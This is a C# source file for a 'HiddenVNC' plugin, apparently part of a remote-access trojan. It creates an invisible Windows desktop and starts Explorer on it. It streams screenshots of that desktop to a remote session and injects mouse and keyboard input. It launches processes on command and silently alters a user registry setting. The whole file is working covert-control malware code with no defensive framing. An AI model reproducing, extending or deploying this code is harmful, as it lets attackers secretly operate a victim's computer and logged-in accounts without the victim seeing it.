using Common.Communication;
using Common.DTOs.MessagePack;
using Microsoft.Win32;
using System.Collections.Concurrent;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

namespace HiddenVNC
{
    public class Plugin
    {
        private IntPtr _hwndDesktop;
        private string _desktopName = "hdesktop";
        private System.Drawing.Size _desktopSize;
        private float _scalingFactor;
        private Graphics _desktopGraphics;
        Bitmap _bmp;
        IntPtr _dc;

        CancellationTokenSource _cancellationTokenSource = new();
        BlockingCollection<byte[]> _frames;
        ImageCodecInfo _jpegEncoder;
        EncoderParameters _encoderParameter;
        Session _session;

        public Plugin(Session session)
        {
            _session = session;
            _session.OnHVNC += HandlePacket;
            _jpegEncoder = GetEncoder(ImageFormat.Jpeg);
            _encoderParameter = new EncoderParameters(1)
            {
                Param = new[] { new EncoderParameter(Encoder.Quality, 50L) }
            };
            InitilizeHVNC();
            Task.Run(Start);
        }

        private void HandlePacket(object? sender, EventArgs e)
        {
            var dto = (HVNCDTO)sender;

            if (dto.Char != null)
            {
                HandleKeyInput(new KeyInput
                {
                    isKeyPressed = dto.IsPressed,
                    key = dto.Char,
                });
            }
            else if (dto.process != null)
            {
                StartProcess(dto.process);
            }
            else if (dto.MouseButton != 0)
            {
                HandleMouseInput(new MouseInput
                {
                    button = (MouseButton)dto.MouseButton,
                    scrollDelta= dto.scrollDelta,
                    state = (MouseButtonState)(Convert.ToInt32(!dto.IsPressed)),
                    xFactor = dto.xFactor,
                    yFactor = dto.yFactor,
                });
            }else if (dto.scrollDelta != 0)
            {
                HandleMouseInput(new MouseInput
                {
                    scrollDelta=dto.scrollDelta,
                    xFactor = dto.xFactor,
                    yFactor = dto.yFactor,
                });
            }
            else
            {

                HandleMouseInput(new MouseInput
                {
                    xFactor = dto.xFactor,
                    yFactor = dto.yFactor,
                });
            }
        }



        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            return ImageCodecInfo.GetImageEncoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
        }
        private void InitilizeHVNC()
        {
            Task.Run(() =>
            {
                //AllocConsole();

                IntPtr temp = OpenDesktop(_desktopName, 0, true, (UInt32)DESKTOP_ACCESS.GENERIC_ALL);
                if (temp == IntPtr.Zero)
                {
                    temp = CreateDesktop(_desktopName, IntPtr.Zero, IntPtr.Zero, 0, (UInt32)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
                }
                _hwndDesktop = temp;

                //SetThreadDesktop(_hwndDesktop);
                StartExplorer();
                _scalingFactor = GetScalingFactor();
                _desktopSize = GetDesktopBounds();
                _bmp = new(_desktopSize.Width, _desktopSize.Height);
                _desktopGraphics = Graphics.FromImage(_bmp);
                _dc = GetDC(IntPtr.Zero);
            }).Wait();
        }

        const int WM_MBUTTONDOWN = 0x0207;
        const int WM_MBUTTONUP = 0x0208;
        const int WM_LBUTTONDOWN = 0x0201;
        const int WM_LBUTTONUP = 0x0202;
        private const int SC_MINIMIZE = 0xF020;
        private const int HTCLOSE = 20;
        private const int WM_MBUTTONDBLCLK = 0x0209;
        private const int WM_LBUTTONDBLCLK = 0x0203;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_RBUTTONDOWN = 0x0204;
        private const int WM_RBUTTONUP = 0x0205;
        private const int WM_NCHITTEST = 0x0084;
        private const int WM_CLOSE = 0x0010;
        private const int HTMAXBUTTON = 9;
        private const int HTMINBUTTON = 8;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_MAXIMIZE = 0xF030;
        private const int SW_MAXIMIZE = 3;
        private const int SW_MINIMIZE = 6;
        private const int SC_RESTORE = 0xF120;
        private const int SW_NORMAL = 1;
        private const int WM_MOUSEMOVE = 0x0200;
        private const int HTCAPTION = 2;
        private const int WM_MOUSEWHEEL = 0x020A;
        private const int HTBOTTOM = 15;
        private const int HTBOTTOMLEFT = 16;
        private const int HTBOTTOMRIGHT = 17;
        private const int HTRIGHT = 11;
        private const int HTLEFT = 10;
        private const int HTTOPRIGHT = 14;
        private const int HTTOPLEFT = 13;
        private const int WM_CHAR = 0x0102;
        private const int VK_BACK = 0x08;
        private const int VK_RETURN = 0x0D;







        public enum MouseButton
        {
            Right =1,

            Left,

        }

        public enum MouseButtonState
        {
            Pressed,
            Released,
        }

        public struct MouseInput
        {
            public MouseButton? button;
            public MouseButtonState? state;
            public double xFactor;
            public double yFactor;
            public int? scrollDelta;
        }

        [DllImport("user32.dll")]
        public static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        [StructLayout(LayoutKind.Sequential)]
        public struct WINDOWPLACEMENT
        {
            public int length;
            public int flags;
            public int showCmd;
            public POINT ptMinPosition;
            public POINT ptMaxPosition;
            public RECT rcNormalPosition;
        }

        private IntPtr CordinatesMakeLParam(int x, int y)
        {
            return (IntPtr)((y << 16) | (x & 0xFFFF));
        }

        private IntPtr ScrollDeltaMakeWParam(int delta)
        {
            return (IntPtr)((delta << 16) | (0 & 0xFFFF));
        }




        bool adjustingWindow = false;
        POINT? lastMousePoint;
        int nchHitTestResult = 0;
        IntPtr hWnd;
        RECT wr;
        IntPtr lParam;
        public void HandleMouseInput(MouseInput mi)
        {
            Task.Run(() =>
            {
                lock (_lock)
                {
                    bool result = SetThreadDesktop(_hwndDesktop);

                    if (result == false)
                    {
                        return;
                    }

                    POINT screenPoint = new POINT()
                    {
                        x = (int)(_desktopSize.Width * mi.xFactor * _scalingFactor),
                        y = (int)(_desktopSize.Height * mi.yFactor * _scalingFactor),
                    };

                    if (!adjustingWindow)
                    {
                        hWnd = GetWindowFromMousePosition(screenPoint);
                    }

                    if (hWnd == IntPtr.Zero)
                    {
                        return;
                    }

                    DeleteObject(lParam);
                    lParam = CordinatesMakeLParam(screenPoint.x, screenPoint.y);

                    if (!adjustingWindow)
                    {
                        nchHitTestResult = (SendMessage(hWnd, WM_NCHITTEST, IntPtr.Zero, lParam)).ToInt32();

                        if (mi.state is not null)
                            switch (nchHitTestResult)
                            {
                                case HTCLOSE:
                                    PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                                    break;

                                case HTMAXBUTTON:

                                    WINDOWPLACEMENT wp = new WINDOWPLACEMENT();
                                    wp.length = Marshal.SizeOf(wp);
                                    GetWindowPlacement(hWnd, ref wp);

                                    if (wp.showCmd == SW_MAXIMIZE)
                                    {
                                        PostMessage(hWnd, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
                                    }
                                    else if (wp.showCmd == SW_NORMAL)
                                    {
                                        PostMessage(hWnd, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
                                    }
                                    break;

                                case HTMINBUTTON:
                                    PostMessage(hWnd, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
                                    break;
                            }
                    }

                    POINT clientPoint = screenPoint;

                    if (!ScreenToClient(hWnd, ref clientPoint))
                    {
                        return;
                    }

                    if (!IsWindowVisible(hWnd))
                    {
                        return;
                    }



                    int x = clientPoint.x;
                    int y = clientPoint.y;
                    DeleteObject(lParam);
                    lParam = CordinatesMakeLParam(x, y);
                    GetWindowRect(hWnd, out wr);

                    switch (mi.state)
                    {
                        case null:

                            if (mi.scrollDelta is not null)
                            {
                                PostMessage(hWnd, WM_MOUSEWHEEL, ScrollDeltaMakeWParam(mi.scrollDelta.Value), lParam);
                                break;
                            }

                            if (adjustingWindow)
                            {
                                int deltaX = screenPoint.x - lastMousePoint.Value.x;
                                int deltaY = screenPoint.y - lastMousePoint.Value.y;

                                switch (nchHitTestResult)
                                {
                                    case HTCAPTION:
                                        MoveWindow(hWnd, wr.Left + deltaX, wr.Top + deltaY, wr.Right - wr.Left, wr.Bottom - wr.Top, false);
                                        break;

                                    case HTLEFT:
                                        MoveWindow(hWnd, wr.Left + deltaX, wr.Top, wr.Right - wr.Left - deltaX, wr.Bottom - wr.Top, true);
                                        break;

                                    case HTRIGHT:
                                        MoveWindow(hWnd, wr.Left, wr.Top, wr.Right - wr.Left + deltaX, wr.Bottom - wr.Top, true);
                                        break;

                                    case HTBOTTOM:
                                        MoveWindow(hWnd, wr.Left, wr.Top, wr.Right - wr.Left, wr.Bottom - wr.Top + deltaY, true);
                                        break;

                                    case HTBOTTOMRIGHT:
                                        MoveWindow(hWnd, wr.Left, wr.Top, wr.Right - wr.Left + deltaX, wr.Bottom - wr.Top + deltaY, true);
                                        break;

                                    case HTTOPLEFT:
                                        MoveWindow(hWnd, wr.Left + deltaX, wr.Top + deltaY, wr.Right - wr.Left - deltaX, wr.Bottom - wr.Top - deltaY, true);
                                        break;

                                    case HTBOTTOMLEFT:
                                        MoveWindow(hWnd, wr.Left + deltaX, wr.Top - deltaY, wr.Right - wr.Left - deltaX, wr.Bottom - wr.Top + deltaY, true);
                                        break;

                                    case HTTOPRIGHT:
                                        MoveWindow(hWnd, wr.Left, wr.Top, wr.Right - wr.Left + deltaX, wr.Bottom - wr.Top - deltaY, true);
                                        break;
                                }
                            }

                            PostMessage(hWnd, WM_MOUSEMOVE, IntPtr.Zero, lParam);

                            break;

                        case MouseButtonState.Released:
                            if (mi.button == MouseButton.Left)
                            {
                                PostMessage(hWnd, WM_LBUTTONUP, IntPtr.Zero, lParam);
                                adjustingWindow = false;
                            }
                            else if (mi.button == MouseButton.Right)
                            {
                                PostMessage(hWnd, WM_RBUTTONUP, IntPtr.Zero, lParam);
                            }
                            break;

                        case MouseButtonState.Pressed:
                            int width = wr.Right - wr.Left;
                            int height = wr.Bottom - wr.Top;
                            if (mi.button == MouseButton.Left)
                            {
                                //StringBuilder parentName = new StringBuilder();
                                //GetWindowText(hWnd, parentName, 100);
                                //Debug.WriteLine(parentName.ToString());
                                //IntPtr test = ChildWindowFromPoint(hWnd, clientPoint);

                                //StringBuilder childName = new StringBuilder();
                                //GetWindowText(test, childName, 100);
                                //Debug.WriteLine(childName.ToString());


                                //POINT childP = new POINT();
                                //ScreenToClient(test, ref childP);
                                //PostMessage(hWnd, WM_LBUTTONDOWN, IntPtr.Zero, CordinatesMakeLParam(30,40));
                                //Task.Delay(20).Wait();
                                //PostMessage(hWnd, WM_LBUTTONUP, IntPtr.Zero, CordinatesMakeLParam(30, 40));


                                PostMessage(hWnd, WM_LBUTTONDOWN, IntPtr.Zero, lParam);
                                if (nchHitTestResult == HTCAPTION || nchHitTestResult == HTLEFT || nchHitTestResult == HTRIGHT || nchHitTestResult == HTBOTTOM || nchHitTestResult == HTTOPLEFT || nchHitTestResult == HTTOPRIGHT)
                                {
                                    adjustingWindow = true;
                                }
                            }
                            else if (mi.button == MouseButton.Right)
                            {
                                PostMessage(hWnd, WM_RBUTTONDOWN, IntPtr.Zero, lParam);
                            }
                            break;

                        default:
                            break;
                    }
                    lastMousePoint = screenPoint;
                }
            }).Wait();
        }

        private IntPtr ParseVirtualKeycodeToBinary(int value)
        {
            return (IntPtr)((value << 16) | (0 & 0xFFFF));
        }

        private IntPtr BuildKeyParameter(int repeatCount, int scanCode, bool isExtendedKey, bool contextCode, bool previousKeyState, bool transitionState)
        {

            int lParam = repeatCount & 0xFFFF; // Bits 0-15: repeat count

            lParam |= (scanCode & 0xFF) << 16; // Bits 16-23: scan code

            // Set the extended key flag in lParam.
            // isExtendedKey indicates whether the key is an extended key (such as the right-hand ALT and CTRL keys).
            // It occupies bit 24. If isExtendedKey is true, bit 24 is set to 1; otherwise, it remains 0.
            lParam |= (isExtendedKey ? 1 : 0) << 24; // Bit 24: extended key flag

            // Bits 25-28 are reserved and not used, so we skip setting them.


            lParam |= (contextCode ? 1 : 0) << 29; // Bit 29: context code
            lParam |= (previousKeyState ? 1 : 0) << 30; // Bit 30: previous key state
            lParam |= (transitionState ? 1 : 0) << 31; // Bit 31: transition state
            return new IntPtr(lParam);


        }
        public struct KeyInput
        {
            public bool isKeyPressed;
            public bool leftshiftPressed;
            public string key;
        }
        public const int MAPVK_VK_TO_VSC = 0x00;
        const short VK_LSHIFT = 0xA0;
        bool isShiftPressed = false;
        public void HandleKeyInput(KeyInput keyInput)
        {
            Task.Run(() =>
            {
                lock (_lock)
                {
                    char keyChar = keyInput.key[0];



                    short vKey = VkKeyScanA(keyChar);
                    IntPtr wParam = (IntPtr)((int)vKey & 0xFFFF);
                    int scanCode = MapVirtualKey((uint)(vKey & 0xFF), 0); // Map virtual key to scan code

                    SetThreadDesktop(_hwndDesktop);


                    switch (keyInput.isKeyPressed)
                    {
                        case false:
                            IntPtr lParamKeyUp = BuildKeyParameter(1, scanCode, false, false, true, true);


                            if (keyChar == '\b')
                            {
                                PostMessage(hWnd, WM_KEYUP, VK_BACK, lParamKeyUp);
                                return;
                            }
                            else if (keyChar == '\r')
                            {
                                PostMessage(hWnd, WM_KEYUP, VK_RETURN, IntPtr.Zero);
                                return;
                            }
                            //else if(keyChar == '\u0001')
                            //{

                            //}


                            PostMessage(hWnd, WM_KEYUP, wParam, lParamKeyUp);
                            break;

                        case true:

                            IntPtr lParamKeyDown = BuildKeyParameter(1, scanCode, false, false, false, false);

                            if (keyChar == '\b')
                            {
                                PostMessage(hWnd, WM_KEYDOWN, VK_BACK, lParamKeyDown);
                                return;
                            }
                            else if (keyChar == '\r')
                            {
                                PostMessage(hWnd, WM_KEYDOWN, VK_RETURN, IntPtr.Zero);
                                return;
                            }
                            //else if (keyChar == '\u0001')
                            //{
                            //    PostMessage(hWnd, WM_KEYDOWN, VK_RETURN, IntPtr.Zero);
                            //    return;
                            //}


                            PostMessage(hWnd, WM_CHAR, (IntPtr)keyChar, lParamKeyDown);
                            break;
                    }
                }


            }).Wait();
        }

        [DllImport("user32.dll")]
        public static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();


        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int x;
            public int y;
        }


        private IntPtr GetWindowFromMousePosition(POINT p)
        {
            return WindowFromPoint(p);
        }

        Task captureTask = Task.CompletedTask;
        MemoryStream ms = new MemoryStream();
        public async Task Start()
        {
            captureTask = Task.Run(async () =>
            {
                while (!_cancellationTokenSource.Token.IsCancellationRequested)
                {
                    Bitmap bmp = await CaptureHidden();
                    bmp.Save(ms, _jpegEncoder, _encoderParameter);
                   
                    await _session.SendPacketAsync(new HVNCDTO()
                    {
                        Frame = ms.ToArray()
                    });

                    ms.SetLength(0);
                    bmp.Dispose();
                }
            }, _cancellationTokenSource.Token);
        }

        public void Stop()
        {
            Task.Run(async () =>
            {
                _desktopGraphics.Dispose();
                _cancellationTokenSource.Cancel();
                await captureTask;

                bool result = CloseDesktop(_hwndDesktop);
                uint err = GetLastError();

                GC.Collect();
            }).Wait();
        }

        private async Task<Bitmap> CaptureHidden()
        {
            return await CreateScreenShootFromHiddenDesktop();
        }

        private readonly object _lock = new object();
        //private List<IntPtr> RetrieveAllWindowsInZOrder()
        //{
        //    bool result;
        //    result = SetThreadDesktop(_hwndDesktop);

        //    List<IntPtr> windows = new List<IntPtr>();
        //    void AddNextWindowInZOrder(IntPtr hWnd)
        //    {
        //        IntPtr nextHWnd = GetWindow(hWnd, (uint)GetWindowType.GW_HWNDNEXT);
        //        if (nextHWnd != IntPtr.Zero)
        //        {

        //            windows.Add(nextHWnd);
        //            AddNextWindowInZOrder(nextHWnd);
        //        }
        //    }

        //    IntPtr firstHWnd = GetTopWindow(IntPtr.Zero);
        //    if (firstHWnd != IntPtr.Zero)
        //    {
        //        windows.Add(firstHWnd);
        //        AddNextWindowInZOrder(firstHWnd);
        //    }

        //    return windows;
        //}

        //private async Task<Bitmap> CreateScreenShootFromHiddenDesktop()
        //{
        //    List<IntPtr> windows = RetrieveAllWindowsInZOrder();

        //    for (int i = windows.Count - 1; i > 0; i--)
        //    {
        //        if (!IsWindowVisible(windows[i]))
        //            continue;

        //        await CaptureWindow(windows[i]);
        //    }


        //    return (Bitmap)_bmp.Clone();

        //}
        //private async Task CaptureWindow(IntPtr hWnd)
        //{
        //    SetThreadDesktop(_hwndDesktop);
        //    RECT rect;
        //    GetWindowRect(hWnd, out rect);
        //    IntPtr tempDC = CreateCompatibleDC(_dc);
        //    IntPtr tempBMP = CreateCompatibleBitmap(_dc, (int)((rect.Right - rect.Left) * _scalingFactor), (int)((rect.Bottom - rect.Top) * _scalingFactor));
        //    SelectObject(tempDC, tempBMP);
        //    bool result = PrintWindow(hWnd, tempDC, 2);
        //    Bitmap processBmp = Bitmap.FromHbitmap(tempBMP);
        //    _desktopGraphics.DrawImage(processBmp, new System.Drawing.Point((int)(rect.Left * _scalingFactor), (int)(rect.Top * _scalingFactor)));
        //    DeleteObject(tempBMP);
        //    ReleaseDC(IntPtr.Zero, tempDC);
        //    DeleteDC(tempDC);
        //    processBmp.Dispose();
        //}



        //__________________

        private readonly object gdiLock = new();
        private async Task<Bitmap> CreateScreenShootFromHiddenDesktop()
        {
            List<IntPtr> windows = RetrieveAllWindowsInZOrder();
            ConcurrentDictionary<int, (RECT, Bitmap)> concurrentBuffer = new();

            var result = Parallel.For(0, windows.Count, new ParallelOptions()
            {
                MaxDegreeOfParallelism = 200,
            }, (i) =>
            {

                IntPtr hWnd = windows[i];
                SetThreadDesktop(_hwndDesktop);
                GetWindowRect(hWnd, out RECT rect);

                IntPtr tempDC;
                IntPtr tempBMP;


                lock (gdiLock)
                {
                    tempDC = CreateCompatibleDC(_dc);
                    tempBMP = CreateCompatibleBitmap(_dc, (int)((rect.Right - rect.Left) * _scalingFactor), (int)((rect.Bottom - rect.Top) * _scalingFactor));
                }



                IntPtr oldBMP = SelectObject(tempDC, tempBMP);


                bool printResult = PrintWindow(hWnd, tempDC, 2);

                if (printResult)
                {
                    using (Bitmap processBmp = Bitmap.FromHbitmap(tempBMP))
                    {
                        Bitmap clonedBmp = (Bitmap)processBmp.Clone();
                        while (!concurrentBuffer.TryAdd(i, (rect, clonedBmp)) && !_cancellationTokenSource.Token.IsCancellationRequested) ;
                    }
                }
                else
                {
                    while (!concurrentBuffer.TryAdd(i, (rect, null)) && !_cancellationTokenSource.Token.IsCancellationRequested) ;
                }

                SelectObject(tempDC, oldBMP);
                DeleteObject(tempBMP);



                ReleaseDC(IntPtr.Zero, tempDC);
                DeleteDC(tempDC);
            });



            Bitmap finalBitmap = new Bitmap(_bmp.Width, _bmp.Height);
            using (Graphics graphics = Graphics.FromImage(finalBitmap))
            {
                for (int i = concurrentBuffer.Count - 1; i >= 0; i--)
                {
                    if (concurrentBuffer[i].Item2 is null)
                    {
                        continue;
                    }

                    SetThreadDesktop(_hwndDesktop);
                    graphics.DrawImage(concurrentBuffer[i].Item2, new System.Drawing.Point((int)(concurrentBuffer[i].Item1.Left * _scalingFactor), (int)(concurrentBuffer[i].Item1.Top * _scalingFactor)));
                    concurrentBuffer[i].Item2.Dispose();
                }
            }

            return finalBitmap;
        }


        private List<IntPtr> RetrieveAllWindowsInZOrder()
        {
            bool result;
            result = SetThreadDesktop(_hwndDesktop);

            List<IntPtr> windows = new List<IntPtr>();
            void AddNextWindowInZOrder(IntPtr hWnd)
            {
                IntPtr nextHWnd = GetWindow(hWnd, (uint)GetWindowType.GW_HWNDNEXT);
                if (nextHWnd != IntPtr.Zero)
                {
                    if (IsWindowVisible(nextHWnd))
                    {
                        windows.Add(nextHWnd);
                    }

                    AddNextWindowInZOrder(nextHWnd);
                }
            }

            IntPtr firstHWnd = GetTopWindow(IntPtr.Zero);
            if (firstHWnd != IntPtr.Zero)
            {
                windows.Add(firstHWnd);
                AddNextWindowInZOrder(firstHWnd);
            }

            return windows;
        }



        private System.Drawing.Size GetDesktopBounds()
        {
            RECT rect = new RECT();
            GetWindowRect(GetDesktopWindow(), out rect);
            return new System.Drawing.Size((int)(rect.Right * _scalingFactor), (int)(rect.Bottom * _scalingFactor));
        }

        private enum DESKTOP_ACCESS : UInt32
        {
            DESKTOP_NONE = 0,
            DESKTOP_READOBJECTS = 0x0001,
            DESKTOP_CREATEWINDOW = 0x0002,
            DESKTOP_CREATEMENU = 0x0004,
            DESKTOP_HOOKCONTROL = 0x0008,
            DESKTOP_JOURNALRECORD = 0x0010,
            DESKTOP_JOURNALPLAYBACK = 0x0020,
            DESKTOP_ENUMERATE = 0x0040,
            DESKTOP_WRITEOBJECTS = 0x0080,
            DESKTOP_SWITCHDESKTOP = 0x0100,
            GENERIC_ALL = (UInt32)(DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                            DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                            DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        private enum GetWindowType : UInt32
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }

        private static float GetScalingFactor()
        {
            using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
            {
                IntPtr desktop = graphics.GetHdc();
                int logicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
                int physicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);
                float scalingFactor = (float)physicalScreenHeight / logicalScreenHeight;
                return scalingFactor;
            }
        }

        public void StartProcess(string path)
        {
            Task.Run(() =>
            {
                SetThreadDesktop(_hwndDesktop);
                STARTUPINFO si = new STARTUPINFO();
                si.cb = (int)Marshal.SizeOf(si);
                si.lpDesktop = _desktopName;
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                bool result = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref si, out pi);
            }).Wait();

        }

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(
       string lpApplicationName,
       string lpCommandLine,
       IntPtr lpProcessAttributes,
       IntPtr lpThreadAttributes,
       bool bInheritHandles,
       int dwCreationFlags,
       IntPtr lpEnvironment,
       string lpCurrentDirectory,
       ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        public void StartExplorer()
        {
            Task.Run(() =>
            {
                uint neverCombine = 2;
                string valueName = "TaskbarGlomLevel";
                string explorerKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced";
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(explorerKeyPath, true))
                {
                    if (key != null)
                    {
                        object value = key.GetValue(valueName);
                        if (value is uint regValue && regValue != neverCombine)
                        {
                            key.SetValue(valueName, neverCombine, RegistryValueKind.DWord);
                        }
                    }
                }

                STARTUPINFO si = new STARTUPINFO();
                si.cb = (int)Marshal.SizeOf(si);
                si.lpDesktop = _desktopName;
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                bool result = CreateProcess(null, "explorer.exe", IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, out pi);
            }).Wait();

        }



        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern short VkKeyScanA(char ch);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int MapVirtualKey(UInt32 uCode, UInt32 uMapType);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, UInt32 dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice,
            IntPtr pDevmode, int dwFlags, UInt32 dwDesiredAccess, IntPtr lpsa);


        [DllImport("user32.dll")]
        public static extern bool MoveWindow(IntPtr hWnd, int x, int y, int width, int height, bool repaint);

        [DllImport("user32.dll", SetLastError = false)]
        public static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport("user32.dll", SetLastError = false)]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetWindowRect(IntPtr hwnd, out RECT lpRect);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, UInt32 nFlags);

        [DllImport("user32.dll")]
        static extern IntPtr GetTopWindow(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetFocus(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

        enum GetWindow_Cmd : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }


        [DllImport("user32.dll")]
        public static extern IntPtr WindowFromPoint(POINT point);

        [DllImport("user32.dll")]
        public static extern IntPtr PostMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("user32.dll")]
        public static extern IntPtr ChildWindowFromPoint(IntPtr hWnd, POINT point);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")]
        static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("gdi32.dll")]
        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

        private enum DeviceCap
        {
            VERTRES = 10,
            DESKTOPVERTRES = 117
        }
    }
}
